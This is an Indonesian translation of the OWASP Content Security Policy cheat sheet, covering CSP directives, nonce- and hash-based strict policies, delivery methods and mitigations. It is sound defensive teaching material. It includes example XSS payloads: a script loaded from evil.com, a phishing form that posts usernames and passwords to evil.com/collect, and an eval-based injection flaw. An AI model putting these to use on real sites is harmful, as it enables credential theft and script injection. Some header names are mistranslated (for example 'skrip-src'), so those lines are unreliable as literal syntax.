---
sidebar_position: 2
---

# Kebijakan Keamanan Konten

## Pendahuluan tentang Kebijakan Keamanan Konten

Artikel ini mengemukakan cara untuk mengintegrasikan konsep __defense in depth__ ke sisi klien aplikasi web. Dengan menyuntikkan header Content-Security-Policy (CSP) dari server, browser mengetahui dan mampu melindungi pengguna dari panggilan dinamis yang akan memuat konten ke halaman yang sedang dikunjungi.

## Konteks

Peningkatan kerentanan XSS (Cross-Site Scripting), clickjacking, dan kebocoran lintas situs menuntut pendekatan keamanan __defense in depth__ yang lebih baik.

### Pertahanan terhadap XSS

CSP bertahan terhadap serangan XSS dengan cara berikut:

#### 1. Membatasi Skrip Sebaris

Dengan mencegah halaman menjalankan skrip sebaris, serangan seperti menyuntikkan

```html
<script>document.body.innerHTML='defaced'</script>
```

tidak akan berhasil.

#### 2. Membatasi Skrip Jarak Jauh

Dengan mencegah halaman memuat skrip dari server sembarangan, serangan seperti menyuntikkan

```html
<script src="https://evil.com/hacked.js"></script>
```

tidak akan berhasil.

#### 3. Membatasi JavaScript yang Tidak Aman

Dengan mencegah halaman menjalankan fungsi teks-ke-JavaScript seperti `eval`, situs web akan aman dari kerentanan seperti ini:

```js
// Kalkulator Sederhana
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`Jumlahnya adalah: ${sum}`); ```

#### 4. Membatasi pengiriman Formulir

Dengan membatasi tempat formulir HTML di situs web Anda dapat mengirimkan datanya, menyuntikkan formulir phishing juga tidak akan berhasil.

```html
<form method="POST" action="https://evil.com/collect">
<h3>Sesi telah berakhir! Silakan masuk lagi.</h3>
<label>Nama pengguna</label>
<input type="text" name="username"/>

<label>Kata sandi</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

#### 5. Membatasi Objek

Dengan membatasi tag [objek](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) HTML, penyerang juga tidak akan dapat menyuntikkan flash/Java/executable lawas lainnya yang berbahaya ke halaman.

### Pertahanan terhadap serangan framing

Serangan seperti clickjacking dan beberapa varian serangan side-channel browser (xs-leaks) mengharuskan situs web berbahaya memuat situs web target dalam frame.

Secara historis, header `X-Frame-Options` telah digunakan untuk ini, tetapi telah ditinggalkan oleh direktif CSP `frame-ancestors`.

### Pertahanan Mendalam

CSP yang kuat menyediakan **lapisan kedua** perlindungan yang efektif terhadap berbagai jenis kerentanan, terutama XSS. Meskipun CSP tidak mencegah aplikasi web dari *mengandung* kerentanan, CSP dapat membuat kerentanan tersebut jauh lebih sulit untuk dieksploitasi oleh penyerang.

Bahkan pada situs web yang sepenuhnya statis, yang tidak menerima masukan pengguna apa pun, CSP dapat digunakan untuk menegakkan penggunaan [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). Ini dapat membantu mencegah kode berbahaya dimuat di situs web jika salah satu situs pihak ketiga yang menghosting file JavaScript (seperti skrip analitik) disusupi.

Dengan semua yang telah dikatakan, CSP **tidak boleh** diandalkan sebagai satu-satunya mekanisme pertahanan terhadap XSS. Anda tetap harus mengikuti praktik pengembangan yang baik seperti yang dijelaskan dalam [Cross-Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), lalu menerapkan CSP di atasnya sebagai lapisan keamanan bonus.

## Pengiriman Kebijakan

Anda dapat mengirimkan Kebijakan Keamanan Konten ke situs web Anda dengan tiga cara.

### 1. Header Kebijakan Keamanan Konten

Kirim header respons HTTP Kebijakan Keamanan Konten dari server web Anda.

```text
Kebijakan Keamanan Konten: ...
```

Menggunakan header adalah cara yang lebih disukai dan mendukung rangkaian fitur CSP lengkap. Kirimkan dalam semua respons HTTP, bukan hanya halaman indeks.

Ini adalah header standar Spesifikasi W3C. Didukung oleh Firefox 23+, Chrome 25+, dan Opera 19+

### 2. Header Hanya Laporan Kebijakan Keamanan Konten

Dengan menggunakan `Hanya Laporan Kebijakan Keamanan Konten`, Anda dapat mengirimkan CSP yang tidak diberlakukan.

```text
Content-Security-Policy-Report-Only: ...
```

Tetap saja, laporan pelanggaran dicetak ke konsol dan dikirimkan ke titik akhir pelanggaran jika arahan `report-to` dan `report-uri` digunakan.

Ini juga merupakan tajuk standar Spesifikasi W3C. Didukung oleh Firefox 23+, Chrome 25+, dan Opera 19+, yang mana kebijakannya tidak memblokir ("gagal dibuka") dan laporan dikirim ke URL yang ditetapkan oleh arahan `report-uri` (atau `report-to` yang lebih baru). Ini sering digunakan sebagai pendahulu untuk memanfaatkan CSP dalam mode pemblokiran ("gagal ditutup")

Peramban sepenuhnya mendukung kemampuan situs untuk menggunakan `Content-Security-Policy` dan `Content-Security-Policy-Report-Only` secara bersamaan, tanpa masalah apa pun. Pola ini dapat digunakan misalnya untuk menjalankan kebijakan `Report-Only` yang ketat (untuk mendapatkan banyak laporan pelanggaran), sementara memiliki kebijakan yang lebih longgar (untuk menghindari pelanggaran fungsi situs yang sah).

### 3. Tag Meta Content-Security-Policy

Terkadang Anda tidak dapat menggunakan header Content-Security-Policy jika Anda, misalnya, Menyebarkan file HTML Anda di CDN yang headernya berada di luar kendali Anda.

Dalam kasus ini, Anda masih dapat menggunakan CSP dengan menentukan tag meta `http-equiv` dalam markup HTML, seperti ini:

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

Hampir semuanya masih didukung, termasuk pertahanan XSS penuh. Namun, Anda tidak akan dapat menggunakan [perlindungan framing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), atau [titik akhir pencatatan pelanggaran CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).

### PERINGATAN

**JANGAN** menggunakan `X-Content-Security-Policy` atau `X-WebKit-CSP`. Implementasinya sudah usang (sejak Firefox 23, Chrome 25), terbatas, tidak konsisten, dan sangat bermasalah.

## Jenis CSP (berbasis granular/daftar izin atau ketat)

Mekanisme asli untuk membangun CSP melibatkan pembuatan daftar izin yang akan menentukan konten dan sumber yang diizinkan dalam konteks halaman HTML.

Namun, praktik terbaik saat ini adalah membuat CSP "Ketat" yang jauh lebih mudah diterapkan dan lebih aman karena kecil kemungkinannya untuk dilewati.

## CSP Ketat

CSP ketat dapat dibuat dengan menggunakan sejumlah terbatas [Petunjuk Pengambilan yang tercantum di bawah](#fetch-directives) granular yang tercantum di bawah ini bersama dengan salah satu dari dua mekanisme:

- Berbasis nonce
- Berbasis hash

Petunjuk `strict-dynamic` secara opsional juga dapat digunakan untuk mempermudah penerapan CSP Ketat.

Bagian berikut akan memberikan beberapa panduan dasar untuk mekanisme ini, tetapi sangat disarankan untuk mengikuti petunjuk Google yang terperinci dan metodis untuk membuat CSP Ketat:

**[Mitigasi skrip lintas situs (XSS) dengan Kebijakan Keamanan Konten (CSP) yang ketat](https://web.dev/strict-csp/)**

### Berbasis nonce

Nonce adalah nilai acak sekali pakai yang unik yang Anda hasilkan untuk setiap respons HTTP, dan tambahkan ke header Content-Security-Policy, seperti ini:

```js
const nonce = uuid.v4();

scriptSrc += ` 'nonce-${nonce}'`; ```

Anda kemudian akan meneruskan nonce ini ke tampilan Anda (menggunakan nonce memerlukan HTML non-statis) dan merender tag skrip yang terlihat seperti ini:

```html
<script nonce="<%= nonce %>">
...
</script>
```

#### Peringatan

**Jangan** membuat middleware yang mengganti semua tag skrip dengan "script nonce=..." karena skrip yang disuntikkan penyerang akan mendapatkan nonce juga. Anda memerlukan mesin templating HTML yang sebenarnya untuk menggunakan nonce.

### Hash

Ketika skrip sebaris diperlukan, `script-src 'hash_algo-hash'` adalah opsi lain untuk mengizinkan hanya skrip tertentu yang dieksekusi.

```teks
Kebijakan Keamanan Konten: skrip-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

Untuk mendapatkan hash, lihat alat pengembang Google Chrome untuk pelanggaran seperti ini:

> ❌ Menolak untuk menjalankan skrip sebaris karena melanggar arahan Kebijakan Keamanan Konten berikut: "..." Kata kunci 'unsafe-inline', hash (**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**), atau nonce...

Anda juga dapat menggunakan [generator hash](https://report-uri.com/home/hash) ini. Ini adalah [contoh](https://csp.withgoogle.com/docs/faq.html#static-content) yang bagus untuk menggunakan hash.

#### Catatan

Menggunakan hash dapat menjadi pendekatan yang berisiko. Jika Anda mengubah *apa pun* di dalam tag skrip (bahkan spasi) dengan, misalnya, memformat kode Anda, hash akan berbeda, dan skrip tidak akan ditampilkan.

### strict-dynamic

Direktif `strict-dynamic` dapat digunakan sebagai bagian dari Strict CSP dalam kombinasi dengan hash atau nonce.

Jika blok skrip yang memiliki hash atau nonce yang benar membuat elemen DOM tambahan dan mengeksekusi JS di dalamnya, `strict-dynamic` memberi tahu browser untuk mempercayai elemen tersebut juga tanpa harus secara eksplisit menambahkan nonce atau hash untuk masing-masing elemen.

Perhatikan bahwa meskipun `strict-dynamic` adalah fitur CSP level 3, CSP level 3 didukung secara luas di browser modern yang umum.

Untuk detail selengkapnya, lihat [penggunaan strict-dynamic](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).

## Direktif CSP Terperinci

Ada beberapa jenis direktif yang memungkinkan pengembang untuk mengontrol aliran kebijakan secara terperinci. Perhatikan bahwa membuat kebijakan non-Strict yang terlalu terperinci atau permisif cenderung mengarah pada bypass dan hilangnya perlindungan.

### Petunjuk Fetch

Petunjuk fetch memberi tahu browser lokasi tempat sumber daya tepercaya dan dimuat.

Sebagian besar petunjuk fetch memiliki [daftar fallback tertentu yang ditetapkan dalam w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). Daftar ini memungkinkan kontrol terperinci atas sumber skrip, gambar, file, dll.

- `child-src` memungkinkan pengembang untuk mengontrol konteks penelusuran bersarang dan konteks eksekusi pekerja.

- `connect-src` menyediakan kontrol atas permintaan fetch, XHR, eventsource, beacon, dan koneksi websockets.

- `font-src` menetapkan URL tempat font dimuat.

- `img-src` menetapkan URL tempat gambar dapat dimuat.

- `manifest-src` menentukan URL tempat manifes aplikasi dapat dimuat.
- `media-src` menentukan URL tempat sumber daya trek video, audio, dan teks dapat dimuat.
- `prefetch-src` menentukan URL tempat sumber daya dapat diambil terlebih dahulu.
- `object-src` menentukan URL tempat plugin dapat dimuat.
- `script-src` menentukan lokasi tempat skrip dapat dieksekusi. Ini adalah arahan fallback untuk arahan seperti skrip lainnya.
- `script-src-elem` mengontrol lokasi tempat eksekusi permintaan dan blok skrip dapat terjadi.
- `script-src-attr` mengontrol eksekusi pengendali peristiwa.
- `style-src` mengontrol tempat gaya diterapkan ke dokumen. Ini termasuk elemen `<link>`, aturan `@import`, dan permintaan yang berasal dari bidang header respons HTTP `Link`. - `style-src-elem` mengontrol gaya kecuali untuk atribut sebaris.

- `style-src-attr` mengontrol atribut gaya.

- `default-src` adalah arahan fallback untuk arahan fetch lainnya. Arahan yang ditetapkan tidak memiliki pewarisan, namun arahan yang tidak ditetapkan akan kembali ke nilai `default-src`.

### Arahan Dokumen

Arahan dokumen memberi instruksi kepada browser tentang properti dokumen yang akan diterapkan kebijakannya.

- `base-uri` menentukan URL yang memungkinkan yang dapat digunakan elemen `<base>`.

- `plugin-types` membatasi jenis sumber daya yang dapat dimuat ke dalam dokumen (*misalnya* application/pdf). 3 aturan berlaku untuk elemen yang terpengaruh, `<embed>` dan `<object>`:

- Elemen perlu mendeklarasikan jenisnya secara eksplisit.

- Jenis elemen harus sesuai dengan jenis yang dideklarasikan.

- Sumber daya elemen harus sesuai dengan jenis yang dideklarasikan.

- `sandbox` membatasi tindakan halaman seperti mengirimkan formulir.

- Hanya berlaku saat digunakan dengan header permintaan `Content-Security-Policy`.

- Tidak menentukan nilai untuk arahan akan mengaktifkan semua pembatasan sandbox. `Content-Security-Policy: sandbox;`
- [Sintaks Sandbox](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

### Arahan Navigasi

Arahan navigasi memberi tahu browser tentang lokasi yang dapat dinavigasi atau disematkan dokumen.

- `form-action` membatasi URL yang dapat dikirimkan formulir.
- `frame-ancestors` membatasi URL yang dapat menyematkan sumber daya yang diminta di dalam elemen `<frame>`, `<iframe>`, `<object>`, `<embed>`, atau `<applet>`.
- Jika arahan ini ditentukan dalam tag `<meta>`, arahan tersebut diabaikan.
- Arahan ini tidak kembali ke arahan `default-src`. - `X-Frame-Options` dianggap usang oleh arahan ini dan diabaikan oleh agen pengguna.

### Arahan Pelaporan

Arahan pelaporan mengirimkan pelanggaran perilaku yang dicegah ke lokasi yang ditentukan. Arahan ini tidak memiliki tujuan sendiri dan bergantung pada arahan lain.

- `report-to` yang merupakan nama grup yang ditetapkan dalam header dalam nilai header berformat JSON.
- [Dokumentasi report-to MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- Arahan `report-uri` tidak digunakan lagi oleh `report-to`, yang merupakan URI tempat laporan dikirim. - Menggunakan format: `Content-Security-Policy: report-uri https://example.com/csp-reports`

Untuk memastikan kompatibilitas ke belakang, gunakan 2 perintah tersebut secara bersamaan. Setiap kali browser mendukung `report-to`, browser akan mengabaikan `report-uri`. Jika tidak, `report-uri` akan digunakan.

### Sumber Perintah Khusus

| Value            | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| 'none'           | No URLs match.                                                              |
| 'self'           | Refers to the origin site with the same scheme and port number.             |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |

Untuk lebih memahami cara kerja sumber arahan, lihat [daftar sumber dari w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).

## Contoh Kebijakan CSP

### Kebijakan Ketat

Peran kebijakan ketat adalah untuk melindungi dari serangan penyimpanan klasik, serangan refleksi, dan beberapa serangan DOM XSS dan harus menjadi tujuan optimal dari setiap tim yang mencoba menerapkan CSP.

Seperti disebutkan di atas, Google melanjutkan dan menyiapkan [petunjuk](https://web.dev/strict-csp) yang terperinci dan metodologis untuk membuat CSP Ketat.

Berdasarkan petunjuk tersebut, salah satu dari dua kebijakan berikut dapat digunakan untuk menerapkan kebijakan ketat:

#### Kebijakan Ketat Berbasis Nonce

```text
Content-Security-Policy:
script-src 'nonce-{RANDOM}' 'strict-dynamic';
object-src 'none'; base-uri 'none';
```

#### Kebijakan Ketat Berbasis Hash

```text
Content-Security-Policy:
script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
object-src 'none';
base-uri 'none';
```

### Kebijakan CSP Dasar Non-Ketat

Kebijakan ini dapat digunakan jika tidak memungkinkan untuk membuat Kebijakan Ketat dan mencegah pembingkaian lintas situs dan pengiriman formulir lintas situs. Kebijakan ini hanya akan mengizinkan sumber daya dari domain asal untuk semua arahan tingkat default dan tidak akan mengizinkan skrip/gaya sebaris untuk dijalankan.

Jika aplikasi Anda berfungsi dengan batasan ini, hal ini secara drastis mengurangi permukaan serangan Anda dan berfungsi dengan sebagian besar browser modern.

Kebijakan paling dasar mengasumsikan:

- Semua sumber daya dihosting oleh domain dokumen yang sama. - Tidak ada inline atau eval untuk skrip dan sumber daya gaya.
- Tidak perlu situs web lain untuk membingkai situs web.
- Tidak ada pengiriman formulir ke situs web eksternal.

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

Untuk lebih memperketat, seseorang dapat menerapkan yang berikut:

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

Kebijakan ini mengizinkan gambar, skrip, AJAX, dan CSS dari asal yang sama dan tidak mengizinkan sumber daya lain untuk dimuat (misalnya, objek, bingkai, media, dll.).

### Memutakhirkan permintaan yang tidak aman

Jika pengembang bermigrasi dari HTTP ke HTTPS, arahan berikut akan memastikan bahwa semua permintaan akan dikirim melalui HTTPS tanpa fallback ke HTTP:

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### Mencegah serangan framing (clickjacking, kebocoran lintas situs)

- Untuk mencegah semua framing konten Anda, gunakan:
- `Content-Security-Policy: frame-ancestors 'none';`
- Untuk mengizinkan situs itu sendiri, gunakan:
- `Content-Security-Policy: frame-ancestors 'self';`
- Untuk mengizinkan domain tepercaya, lakukan hal berikut:
- `Content-Security-Policy: frame-ancestors trusted.com;`

### Refactoring kode sebaris

Saat perintah `default-src` atau `script-src*` aktif, CSP secara default menonaktifkan kode JavaScript apa pun yang ditempatkan sebaris dalam sumber HTML, seperti ini:

```javascript
<script>
var foo = "314"
<script>
```

Kode sebaris dapat dipindahkan ke berkas JavaScript terpisah dan kode di halaman menjadi:

```javascript
<script src="app.js">
</script>
```

Dengan `app.js` yang berisi kode `var foo = "314"`.

Pembatasan kode sebaris juga berlaku untuk `inline event handlers`, sehingga konstruksi berikut akan diblokir di bawah CSP:

```html
<button id="button1" onclick="doSomething()">
```

Ini harus diganti dengan panggilan `addEventListener`:

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```
## Mitigasi
Berikut adalah daftar mitigasi yang dapat mencegah kebijakan keamanan konten yang rentan:

### 1. Tetapkan Header CSP yang Ketat
- Gunakan header `Content-Security-Policy` dengan arahan yang ketat.

- Contoh: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';`.

### 2. Batasi Sumber untuk Sumber Daya
- Tentukan sumber tepercaya untuk `script-src`, `style-src`, `img-src`, dan arahan sumber daya lainnya.

- Hindari penggunaan arahan umum seperti `*` atau `data:` kecuali jika diperlukan.

### 3. Larang Skrip dan Gaya Sebaris
- Gunakan arahan `'unsafe-inline'` hanya jika benar-benar diperlukan.
- Lebih baik gunakan hash (`sha256-`, `sha384-`) atau nonce (`nonce-`) untuk skrip dan gaya sebaris.

### 4. Hindari Penggunaan `unsafe-eval`
- Hilangkan penggunaan `eval()` dan fungsi serupa dalam skrip Anda.
- Tulis ulang kode untuk menghindari ketergantungan pada `unsafe-eval` di CSP.

### 5. Blokir Konten Campuran
- Terapkan HTTPS untuk semua sumber daya menggunakan direktif `upgrade-insecure-requests`.
- Contoh: `Content-Security-Policy: upgrade-insecure-requests;`.

### 6. Larang Plug-in dan Frame
- Blokir penyematan objek dengan `object-src 'none'`.
- Batasi pembingkaian menggunakan direktif `frame-ancestors`.
- Contoh: `frame-ancestors 'none';`.

### 7. Gunakan Pelaporan untuk Pelanggaran
- Aktifkan pelaporan CSP dengan arahan `report-uri` atau `report-to` untuk memantau pelanggaran.
- Contoh: `Content-Security-Policy: default-src 'self'; report-uri /csp-report;`.

### 8. Terapkan Nonce untuk Konten Dinamis
- Gunakan nonces yang dibuat secara dinamis (`nonce-`) untuk setiap permintaan guna mengizinkan skrip sebaris tepercaya.
- Pastikan nonces bersifat unik dan tidak dapat diprediksi untuk setiap respons HTTP.

### 9. Luncurkan CSP Secara Bertahap
- Mulailah dengan header `Content-Security-Policy-Report-Only` untuk memantau pelanggaran tanpa merusak fungsionalitas.
- Transisi untuk menegakkan CSP setelah pelanggaran diselesaikan.

### 10. Uji dan Validasi CSP
- Gunakan alat seperti [CSP Evaluator](https://csp-evaluator.withgoogle.com/) untuk menganalisis kebijakan Anda.
- Validasi implementasi CSP di berbagai browser dan lingkungan.

### 11. Perbarui dan Pertahankan Kebijakan
- Tinjau dan perbarui CSP secara berkala seiring dengan perkembangan aplikasi.
- Hapus arahan yang tidak digunakan dan perbaiki sumber daya sesuai kebutuhan.

### 12. Berikan edukasi kepada pengembang
- Latih pengembang tentang praktik terbaik CSP dan perannya dalam mencegah XSS dan serangan lainnya.
- Integrasikan CSP ke dalam alur kerja pengembangan untuk mendeteksi masalah lebih dini.

## Referensi

- [Strict CSP](https://web.dev/strict-csp)
- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
- [Content-Security-Policy](https://content-security-policy.com/)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
- CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
- [CSP evaluator](https://csp-evaluator.withgoogle.com/)

###### Copyright © - This cheat sheet was created from the OWASP CheatSheetSeries reference - Source :` https://cheatsheetseries.owasp.org/ `